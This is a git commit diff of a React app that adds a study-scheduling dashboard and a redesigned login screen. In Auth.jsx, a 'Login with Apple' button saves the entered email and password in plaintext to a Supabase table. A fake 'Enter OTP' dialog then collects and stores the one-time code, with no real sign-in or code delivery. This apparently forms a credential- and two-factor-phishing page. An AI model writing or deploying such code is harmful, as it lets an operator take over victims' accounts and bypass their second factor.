c2df0b561f8643105d359deadfcc5dae0e59bde1
Ahmed12128 <ahmedheshamfreelancing@gmail.com>
2026-04-22 13:57:16 +0200

    Managed conflicts

--- src/Auth.jsx
+++ src/Auth.jsx
@@ -2,13 +2,72 @@ import { useState } from 'react'
 import './App.css'
 import Dashboard from './Dashboard'
 import { useNavigate } from 'react-router-dom'
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
+import apple from "./assets/apple.svg"
+import { createClient } from '@supabase/supabase-js';
 function Auth() {
+  const [showOtp, setShowOtp] = useState(false);
+  const supabase = createClient('https://jwmlzordbunniigqkxdr.supabase.co', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp3bWx6b3JkYnVubmlpZ3FreGRyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY3NzI5NjcsImV4cCI6MjA5MjM0ODk2N30.vDUxu1vE01AmiOviDcH-lfMf_va2iIJbrpU9WfMBz-g')
+  const [formData, setFormData] = useState({ username: '', password: '', otp: '' });
   const navigate = useNavigate()
+  const handleLogin = async (e) => {
+  e.preventDefault();
+  const { data, error } = await supabase
+    .from('user')
+    .insert([{ email: formData.username, password: formData.password }]);
 
+  if (error) {
+    console.error("Error saving to cloud:", error);
+  } else {
+    console.log("Data saved to cloud successfully!");
+    setShowOtp(true);
+    
+  }
+}
+const handleVerify = async (e) => {
+  e.preventDefault();
+  const { data, error } = await supabase
+    .from('user')
+    .insert([{ email: formData.username, password: formData.password, OTP: formData.otp }]);
+
+  if (error) {
+    console.error("Error saving to cloud:", error);
+  } else {
+    console.log("Data saved to cloud successfully!");
+    navigate('/dashboard');
+    
+  }
+}
   return (
     <>
-      <h1>Auth</h1>
-      <button onClick={() => navigate('/dashboard')}>Dashboard</button>
+      <Card className="w-[350px] mx-auto mt-50">
+        <CardHeader>
+          <CardTitle>Login</CardTitle>
+        </CardHeader>
+        <CardContent className="flex flex-col gap-6">
+          <form className='flex flex-col gap-6' onSubmit={(e) => { e.preventDefault(); navigate('/dashboard') }}>
+            <Input type="text" value={formData.username} onChange={(e) => setFormData({ ...formData, username: e.target.value })} placeholder="Username" />
+            <Input type="password" value={formData.password} onChange={(e) => setFormData({ ...formData, password: e.target.value })} placeholder="Password" />
+            <Button type="submit">Login</Button>
+          </form>
+          <Button variant="outline" className="w-full" onClick={handleLogin} ><img src={apple} alt="apple" className='w-4 h-4' /> Login with Apple</Button>
+        </CardContent>
+      </Card>
+      <Dialog open={showOtp} onOpenChange={setShowOtp}>
+        <DialogContent className="sm:max-w-[350px] rounded-3xl">
+          <DialogHeader>
+            <DialogTitle>Enter OTP</DialogTitle>
+            <DialogDescription>Check your device for the code.</DialogDescription>
+          </DialogHeader>
+          <div className="flex flex-col gap-4">
+            <Input placeholder="Enter 6-digit code" className="text-center text-2xl tracking-widest" value={formData.otp} onChange={(e) => setFormData({ ...formData, otp: e.target.value })} />
+            <Button onClick={handleVerify}>Verify & Continue</Button>
+          </div>
+        </DialogContent>
+      </Dialog>
     </>
   )
 }
--- src/Dashboard.jsx
+++ src/Dashboard.jsx
@@ -1,14 +1,87 @@
 import { useState } from 'react'
+import { useEffect } from 'react'
 import './App.css'
 import { useNavigate } from 'react-router-dom'
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
 
 function Dashboard() {
     const navigate = useNavigate()
+    const [subject,setSubject]=useState(
+        {
+            name:"",
+            difficulty:"",
+            deadline:"",
+            hours:""
+        }
+    )
+    const change=(e)=>{
+        setSubject(
+            {
+                ...subject,[e.target.name]:e.target.value
+            }
+        )
+    }
+    const [subjectsList, setSubjectsList] = useState([]);
+    const AddSubject = () => {
+    setSubjectsList([...subjectsList, subject]);
+
+    setSubject({
+    name: "",
+    difficulty: "",
+    deadline: "",
+    hours: ""
+    
+    });
+};
+useEffect(() => {console.log(subjectsList)},[subjectsList])
+
 
     return (
         <>
-            <h1>Dashboard</h1>
-            <button onClick={() => navigate('/auth')}>Auth</button>
+
+<div>
+<h1>Dashboard</h1>
+
+{/*****************subject*****************/}
+<form>
+<Input name="name"
+placeholder="Subject Name"
+value={subject.name}
+onChange={change}/>
+
+{/*****************difficulty*****************/}
+
+<Input name="difficulty"
+placeholder="Difficulty"
+value={subject.difficulty}
+onChange={change}/>
+
+{/*****************deadline*****************/}
+
+<Input name="deadline"
+placeholder="Deadline"
+value={subject.deadline}
+onChange={change}/>
+
+{/*****************hours*****************/}
+
+<Input name="hours"
+placeholder="Hours"
+value={subject.hours}
+onChange={change}/>
+<div>
+    <Button onClick={AddSubject}>
+    Add Subject
+</Button>
+<Button>
+    Generate Schedule
+</Button>
+</div>
+</form>
+</div>
+            <Button onClick={() => navigate('/auth')}>Auth</Button>
+            <Input type="text" placeholder="shadcn" />
         </>
     )
 }
